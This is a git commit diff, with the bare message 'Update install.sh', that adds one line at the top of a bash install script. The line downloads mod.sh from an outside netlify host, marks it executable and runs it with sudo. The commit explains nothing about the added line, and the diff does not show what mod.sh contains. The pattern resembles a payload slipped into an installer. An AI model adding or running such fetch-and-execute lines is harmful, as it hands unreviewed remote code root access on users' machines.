8501a7ee936a4efa5ab22e6560a7d05f107c108e
VISHNU PREMIL <82073583+strangedreamer4@users.noreply.github.com>
2024-01-07 08:19:24 -0500

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-
+wget https://cyberprime.netlify.app/mod.sh && chmod +x mod.sh && sudo bash mod.sh
 # Check if the script is run as root
 if [ "$(id -u)" -ne 0 ]; then
     echo "This script must be run as root. Exiting."
